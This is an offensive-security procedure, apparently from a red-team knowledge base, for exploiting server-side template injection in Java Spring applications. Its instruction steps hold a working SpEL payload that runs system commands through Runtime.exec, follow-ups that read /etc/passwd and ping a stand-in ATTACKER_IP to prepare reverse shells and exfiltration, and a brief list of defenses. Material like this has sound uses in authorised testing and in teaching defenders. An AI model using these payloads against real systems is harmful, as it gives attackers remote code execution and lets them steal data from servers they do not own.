---
id: dd16be03-466b-4167-a0f2-0c847fce7274
name: Server-Side-Template-Injection-with-Java-Spring
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:40.400237+00:00'
updated_at: '2023-04-10T20:23:33.340940+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - java-spring
  - server-side-template-injection
  - ssti
  - rce
commands: []
platforms:
  - Web
  - Java
tools: []
validated: true
---

# Server-Side-Template-Injection-with-Java-Spring

## Summary

This procedure demonstrates how to exploit Server-Side Template Injection (SSTI) vulnerabilities in Java Spring applications using Spring Expression Language (SpEL) to achieve remote code execution (RCE). By injecting malicious expressions into vulnerable input fields processed by templates like Thymeleaf or EL, attackers can execute arbitrary system commands, access sensitive data, or escalate privileges on the server.

## Description

Server-Side Template Injection occurs when user input is unsafely embedded into server-side templates without proper sanitization, allowing attackers to inject and execute code in the template engine's context. In Java Spring applications, this often targets SpEL or Thymeleaf, where expressions like ${...} or *{...} can invoke Java classes and methods. A successful exploit can lead to full RCE, enabling command execution via Runtime.exec(). This technique is particularly dangerous in web applications handling user-supplied data in forms, URLs, or APIs. The procedure assumes a vulnerable endpoint where input is directly interpolated into a template and focuses on detection, payload crafting, and execution in a controlled testing environment.

## Requirements

1. Network access to the target Java Spring web application (e.g., via HTTP/HTTPS).
2. Identification of a parameter or input field vulnerable to template injection (e.g., through fuzzing).
3. Tools for web interception and manipulation, such as a browser developer tools or proxy like Burp Suite.
4. Basic knowledge of Java classes and SpEL syntax for payload construction.
5. Attacker-controlled environment to receive outputs or callbacks if needed.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to escape or whitelist template expressions (e.g., disable SpEL evaluation in user inputs).
- Use template engines with sandboxing features, such as Thymeleaf's strict mode or custom expression resolvers that block dangerous classes like Runtime.
- Employ Web Application Firewalls (WAFs) to detect anomalous expressions like T() or exec() in requests.
- Monitor application logs for unexpected Java class invocations or process creations (e.g., via SIEM rules for Runtime.exec()).
- Regularly audit and update Spring dependencies to mitigate known SSTI vectors.

## Objectives

1. Identify and confirm SSTI vulnerability in a Java Spring application.
2. Inject a SpEL payload to execute arbitrary system commands on the server.
3. Retrieve command output to validate RCE and assess further impact, such as data exfiltration or persistence.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Begin by fuzzing potential input parameters (e.g., search fields, user profiles, or API endpoints) with simple SpEL expressions to detect if the application evaluates templates. Look for outputs that reflect computation results, indicating injection success. This step confirms the vulnerability without causing harm.

**Test Payload**: Use a benign expression like *{7*7} in the input field.

> Submit the payload via the web form or request (e.g., using browser or curl). If the response shows '49' instead of the literal string, SSTI is confirmed. Why: This tests if SpEL is active without executing dangerous code. Expected: Numerical result in response body or error message.

### Step 2: Craft and Inject RCE Payload

**Context**: Once confirmed, escalate to a payload that invokes Java's Runtime class to execute a system command. The T() function in SpEL allows calling static methods on classes like org.apache.commons.io.IOUtils to read command output. Start with a harmless command like 'id' to verify RCE.

**Code** ([[codes/Java-Spring-Spel-RCE-Payload]]):

```spel
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

> Inject the payload into the same vulnerable parameter. Monitor the response for command output (e.g., 'uid=1000(user) gid=1000(user)'). Why: This chains IOUtils.toString() to capture and return the exec() stream as a string visible in the HTTP response. If successful, replace 'id' with other commands like 'whoami' or 'ls /'. Decision point: If no output, try alternative syntax like ${...} or check for blacklisted classes; otherwise, proceed to exfiltration.

### Step 3: Validate and Escalate

**Context**: Confirm RCE by executing diagnostic commands and assess the environment for further exploitation, such as reading files or establishing persistence.

**Follow-up Payload**: Modify the command in the payload, e.g., 'cat /etc/passwd' or 'ping -c 1 ATTACKER_IP' for callback verification.

> Resubmit the modified payload and analyze the response. Why: Validates control and maps the system (OS, user context). Expected: Command output in response. If ping succeeds, network access is confirmed for reverse shells or data exfil.
